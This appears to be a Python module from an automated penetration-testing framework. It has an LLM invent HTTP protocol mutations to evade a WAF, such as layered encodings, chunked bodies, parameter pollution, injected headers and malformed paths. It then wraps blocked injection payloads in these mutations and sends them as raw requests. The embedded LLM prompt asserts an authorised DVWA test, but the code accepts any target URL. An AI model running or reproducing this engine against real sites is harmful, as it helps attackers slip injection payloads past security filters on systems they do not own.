"""ProtocolSolver — LLM 负责想象力，Python 负责协议合规。

架构：
  1. LLM 输出 ProtocolMutationStrategy JSON（描述如何变异 HTTP 报文）
  2. PreFlightCorrector 将策略 + 不可变 payload 组装为合规 HTTP 请求
  3. _dispatch_raw 通过 http.client 发送原始 bytes，完全控制报文格式
"""

from __future__ import annotations

import time
from base64 import b64encode
from dataclasses import dataclass, field
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import quote, urlparse, urlencode, parse_qs

from agents.models import RawResponse, SolverRequest
from agents.solver_engines.base import SolverEngine
from llm_engine import _chat_json


# ============================================================
# 数据类
# ============================================================

@dataclass
class HeaderEntry:
    name: str
    value: str


@dataclass
class ProtocolMutationStrategy:
    """LLM 输出的协议变异策略。"""
    method: str | None = None
    uri_path: str | None = None
    add_headers: list[HeaderEntry] = field(default_factory=list)
    remove_headers: list[str] = field(default_factory=list)
    query_params: list[HeaderEntry] = field(default_factory=list)
    body_template: str | None = None
    encoding_layers: list[str] = field(default_factory=list)
    transfer_encoding: str | None = None
    reasoning: str = ""


@dataclass
class CorrectedRequest:
    """PreFlightCorrector 输出的可发包结构。"""
    method: str
    url: str
    headers: dict[str, str]
    body: bytes
    is_chunked: bool = False


# ============================================================
# PreFlightCorrector
# ============================================================

_ENCODING_MAP: dict[str, callable] = {
    "url":            lambda s: quote(s, safe=""),
    "double_url":     lambda s: quote(quote(s, safe=""), safe=""),
    "base64":         lambda s: b64encode(s.encode()).decode(),
    "hex":            lambda s: s.encode().hex(),
    "html_entities":  lambda s: "".join(f"&#{ord(c)};" for c in s),
    "unicode_escape": lambda s: s.encode("unicode_escape").decode(),
    "utf16":          lambda s: "".join(c + "\x00" for c in s),
    "null_byte":      lambda s: s.replace(" ", "%00"),
}


class PreFlightCorrector:
    """将 LLM 策略 + 不可变 payload 组装为合规 HTTP 请求。"""

    CHUNK_SIZE = 4096

    @staticmethod
    def correct(
        strategy: ProtocolMutationStrategy,
        immutable_payload: str,
        target_url: str,
        target_method: str,
        target_headers: dict[str, str],
    ) -> CorrectedRequest:
        # 1. 编码 payload（从内到外逐层叠加）
        encoded_payload = PreFlightCorrector._apply_encoding(
            immutable_payload, strategy.encoding_layers,
        )

        # 2. 构建 headers
        headers = dict(target_headers)
        for h in strategy.add_headers:
            headers[h.name] = h.value
        for name in strategy.remove_headers:
            headers.pop(name, None)

        # 3. 构建 body
        body_bytes = PreFlightCorrector._build_body(
            strategy.body_template, encoded_payload,
            strategy.method or target_method,
        )

        # 4. 处理 Chunked
        is_chunked = (strategy.transfer_encoding or "").lower() == "chunked"
        if is_chunked:
            body_bytes = PreFlightCorrector._assemble_chunked(body_bytes)
            headers["Transfer-Encoding"] = "chunked"
            headers.pop("Content-Length", None)
        else:
            headers["Content-Length"] = str(len(body_bytes))
            headers.pop("Transfer-Encoding", None)

        # 5. 替换 query_params 中的 {{PAYLOAD}} 并构建 URL
        resolved_qparams = [
            HeaderEntry(q.name, q.value.replace("{{PAYLOAD}}", encoded_payload))
            for q in strategy.query_params
        ]

        # 安全兜底：若 {{PAYLOAD}} 未出现在 body 或 query 中，自动注入
        payload_in_body = (strategy.body_template or "").find("{{PAYLOAD}}") >= 0
        payload_in_query = any(
            q.value.find("{{PAYLOAD}}") >= 0 for q in strategy.query_params
        )
        if not payload_in_body and not payload_in_query and encoded_payload:
            resolved_qparams.append(HeaderEntry("q", encoded_payload))

        url = PreFlightCorrector._build_url(
            target_url, strategy.uri_path, resolved_qparams,
        )

        # 6. CRLF 规范化
        headers = {
            k: v.replace("\r\n", "\n").replace("\n", "\r\n").replace("\r\r\n", "\r\n")
            for k, v in headers.items()
        }

        method = (strategy.method or target_method).upper()

        return CorrectedRequest(
            method=method, url=url, headers=headers,
            body=body_bytes, is_chunked=is_chunked,
        )

    @staticmethod
    def _apply_encoding(payload: str, layers: list[str]) -> str:
        result = payload
        for layer in layers:
            fn = _ENCODING_MAP.get(layer.lower())
            if fn:
                result = fn(result)
        return result

    @staticmethod
    def _build_body(
        body_template: str | None,
        encoded_payload: str,
        method: str,
    ) -> bytes:
        if body_template:
            body = body_template.replace("{{PAYLOAD}}", encoded_payload)
            return body.encode("utf-8")
        if method.upper() not in ("GET", "HEAD", "OPTIONS", "TRACE"):
            return encoded_payload.encode("utf-8")
        return b""

    @staticmethod
    def _assemble_chunked(body: bytes) -> bytes:
        if not body:
            return b"0\r\n\r\n"
        chunks = []
        offset = 0
        while offset < len(body):
            chunk = body[offset:offset + PreFlightCorrector.CHUNK_SIZE]
            offset += len(chunk)
            chunks.append(f"{len(chunk):X}\r\n".encode() + chunk + b"\r\n")
        chunks.append(b"0\r\n\r\n")
        return b"".join(chunks)

    @staticmethod
    def _build_url(
        base_url: str,
        uri_path: str | None,
        query_params: list[HeaderEntry],
    ) -> str:
        parsed = urlparse(base_url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname or ""
        port = parsed.port
        original_path = parsed.path or "/"

        path = uri_path if uri_path else original_path
        if not path.startswith("/"):
            path = "/" + path

        # 合并原始 query 和新增 query_params
        original_qs = parse_qs(parsed.query, keep_blank_values=True)
        for qp in query_params:
            original_qs.setdefault(qp.name, []).append(qp.value)
        flat_qs = []
        for k, vs in original_qs.items():
            for v in vs:
                flat_qs.append((k, v))
        query = urlencode(flat_qs) if flat_qs else ""

        port_str = ""
        if port and not ((scheme == "http" and port == 80) or
                         (scheme == "https" and port == 443)):
            port_str = f":{port}"

        url = f"{scheme}://{host}{port_str}{path}"
        if query:
            url += f"?{query}"
        return url


# ============================================================
# ProtocolSolver
# ============================================================

class ProtocolSolver(SolverEngine):
    """协议层绕过引擎：LLM 输出变异策略，Python 组装合规报文。"""

    dimension = "protocol"

    def __init__(self, concurrency: int = 5, timeout: int = 15, model: str = "mimo-v2.5-pro"):
        super().__init__(concurrency=concurrency, timeout=timeout)
        self.model = model

    def generate(self, request: SolverRequest) -> list[str]:
        immutable = request.immutable_payload
        if not immutable:
            return []

        waf_info = ""
        if request.waf_profile:
            waf_info = f"WAF: {request.waf_profile.waf_name}\n绕过提示: {request.waf_profile.bypass_tips}"

        blocked = "\n".join(request.blocked_payloads[-10:]) or "(无)"

        prompt = f"""你是一名授权渗透测试工程师，正在对 DVWA（Damn Vulnerable Web Application）靶场进行 HTTP 协议层安全评估。
DVWA 是一个开源的、专门设计用于安全教学和测试的应用。

任务：给定一个被安全设备拦截的测试向量，设计 HTTP 报文变异策略以验证安全设备的协议解析鲁棒性。

## 不可变 payload（禁止修改其语义）
{immutable}

## 目标信息
URL: {request.target.url}
参数: {request.target.param}
注入类型: {request.target.vuln_type}
后端上下文: {request.target.inferred_context}
闭合字符: {request.target.closure_chars}
{waf_info}

## 已被拦截的 payload（参考）
{blocked}

## 可用变异手段（自由组合）
1. method: HTTP Method 畸形（GET/POST/PUT/DELETE/PATCH/OPTIONS/自定义）
2. add_headers: 注入任意 Header 键值对（X-Forwarded-For, X-Original-URL 等）
3. remove_headers: 移除可能触发 WAF 的 Header
4. query_params: 参数污染 (HPP)，添加同名或额外 query 参数
5. body_template: Body 变异，用 {{{{PAYLOAD}}}} 占位（form/json/xml/raw 格式均可）
6. encoding_layers: 多层编码叠加（从内到外），可选：url, double_url, base64, hex, html_entities, unicode_escape, utf16, null_byte
7. transfer_encoding: "chunked" 利用分块解析差异
8. uri_path: URI 畸形（路径遍历、分号参数、片段注入等）

## 约束
- {{{{PAYLOAD}}}} 必须出现在 body_template 或 query_params 的值中
- 不要修改 payload 的语义，只做外部包装/编码/切片
- 可以将 payload 拆分到多个参数（HPP 切片）
- 每个策略独立，不依赖其他策略

返回 JSON：
{{"mutations": [
  {{"method": null, "uri_path": null, "add_headers": [{{"name": "...", "value": "..."}}],
    "remove_headers": [], "query_params": [{{"name": "...", "value": "..."}}],
    "body_template": "... {{{{PAYLOAD}}}} ...", "encoding_layers": ["url", "base64"],
    "transfer_encoding": null, "reasoning": "..."}},
  ...
]}}"""

        result = _chat_json(prompt, model=self.model, temperature=0.7, max_tokens=4096)
        if not isinstance(result, dict):
            return []

        mutations = result.get("mutations", [])
        strategies = []
        for m in mutations:
            try:
                strategy = ProtocolMutationStrategy(
                    method=m.get("method"),
                    uri_path=m.get("uri_path"),
                    add_headers=[HeaderEntry(**h) for h in m.get("add_headers", [])],
                    remove_headers=m.get("remove_headers", []),
                    query_params=[HeaderEntry(**q) for q in m.get("query_params", [])],
                    body_template=m.get("body_template"),
                    encoding_layers=m.get("encoding_layers", []),
                    transfer_encoding=m.get("transfer_encoding"),
                    reasoning=m.get("reasoning", ""),
                )
                import json as _json
                strategies.append(_json.dumps({
                    "method": strategy.method,
                    "uri_path": strategy.uri_path,
                    "add_headers": [{"name": h.name, "value": h.value} for h in strategy.add_headers],
                    "remove_headers": strategy.remove_headers,
                    "query_params": [{"name": q.name, "value": q.value} for q in strategy.query_params],
                    "body_template": strategy.body_template,
                    "encoding_layers": strategy.encoding_layers,
                    "transfer_encoding": strategy.transfer_encoding,
                    "reasoning": strategy.reasoning,
                }))
            except Exception:
                continue
        return strategies

    def send(self, strategies_json: list[str], request: SolverRequest) -> list[RawResponse]:
        """反序列化策略 → PreFlightCorrector → 原始 HTTP 发包。"""
        import json as _json

        immutable = request.immutable_payload
        target = request.target
        results: list[RawResponse] = []

        for sjson in strategies_json:
            try:
                data = _json.loads(sjson)
                strategy = ProtocolMutationStrategy(
                    method=data.get("method"),
                    uri_path=data.get("uri_path"),
                    add_headers=[HeaderEntry(**h) for h in data.get("add_headers", [])],
                    remove_headers=data.get("remove_headers", []),
                    query_params=[HeaderEntry(**q) for q in data.get("query_params", [])],
                    body_template=data.get("body_template"),
                    encoding_layers=data.get("encoding_layers", []),
                    transfer_encoding=data.get("transfer_encoding"),
                    reasoning=data.get("reasoning", ""),
                )
                corrected = PreFlightCorrector.correct(
                    strategy=strategy,
                    immutable_payload=immutable,
                    target_url=target.url,
                    target_method=target.method,
                    target_headers=target.headers,
                )
                resp = self._dispatch_raw(corrected, strategy.reasoning)
                results.append(resp)
            except Exception as e:
                results.append(RawResponse(
                    payload=sjson[:120], status_code=0,
                    headers={}, body=f"send_error: {e}",
                    elapsed_ms=0, dimension=self.dimension,
                ))
        return results

    def _dispatch_raw(self, req: CorrectedRequest, label: str = "") -> RawResponse:
        """通过 http.client 发送原始 HTTP bytes，完全控制报文格式。"""
        parsed = urlparse(req.url)
        host = parsed.hostname
        port = parsed.port
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        if not port:
            port = 443 if parsed.scheme == "https" else 80

        conn_cls = HTTPSConnection if parsed.scheme == "https" else HTTPConnection
        start = time.monotonic()

        try:
            conn = conn_cls(host, port, timeout=self.timeout)
            # 组装原始 HTTP/1.1 请求 bytes
            raw = f"{req.method} {path} HTTP/1.1\r\n".encode("latin-1")
            for k, v in req.headers.items():
                raw += f"{k}: {v}\r\n".encode("latin-1")
            raw += b"\r\n"
            raw += req.body

            conn._send_output(raw)
            resp = conn.getresponse()

            status = resp.status
            headers = dict(resp.getheaders())
            body = resp.read(50000).decode("utf-8", errors="replace")
            elapsed = int((time.monotonic() - start) * 1000)
            conn.close()

            return RawResponse(
                payload=f"[protocol] {label[:80]}",
                status_code=status, headers=headers,
                body=body, elapsed_ms=elapsed,
                dimension=self.dimension,
            )
        except Exception as e:
            elapsed = int((time.monotonic() - start) * 1000)
            return RawResponse(
                payload=f"[protocol] {label[:80]}",
                status_code=0, headers={},
                body=f"dispatch_error: {e}",
                elapsed_ms=elapsed, dimension=self.dimension,
            )
